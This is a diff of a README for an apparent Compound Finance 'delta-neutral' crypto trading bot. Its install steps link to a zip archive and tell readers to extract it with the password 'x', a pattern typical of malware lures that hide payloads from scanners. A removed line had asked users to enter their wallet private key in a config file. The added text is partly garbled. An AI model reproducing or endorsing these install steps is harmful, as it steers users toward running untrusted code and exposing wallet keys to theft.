@@ -4,12 +4,15 @@ A delta-neutral strategy with Compound Finance involves employing a financial ap
 ## How to install
 - [Clone](https://github.com/medlaare/delta-neutral-strategy/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
 - Extract archive with password `x`
-- Modify the `address` and `private_key` entries within the `config.json` file.
+- Modify the the config file In this example:
+- `compound_api_key` is a placeholder for your Compound Finance API key.
+- `rpc_url` is the endpoint for the Ethereum, Polygon, and Arbitrum RPC providers.
+- `gas_limit` and `gas_price` are parameters to control transaction costs.
+- `rebalancing_time` specifies the time for periodic rebalancing.
+- `timeout` is the maximum time allowed for a transaction to be confirmed.
+- `position_size_eth` and `position_size_matic` represent the desired position size on Ethereum and Polygon networks, respectively.
 - Run the bot.
-- Establish `parameters` for optimizing interest costs on borrowed assets.
-- Define how often the strategy should rebalance to maintain Delta neutrality.
-- you can choose strategies for optimizing `gas` costs, such as batched transactions or utilizing layer 2 solutions.
-- Consider factors like gas costs and market volatility when determining the rebalancing frequency.
+
 ```
   # Tool Configuration for Compound Finance Strategy
 # Compound Finance API settings
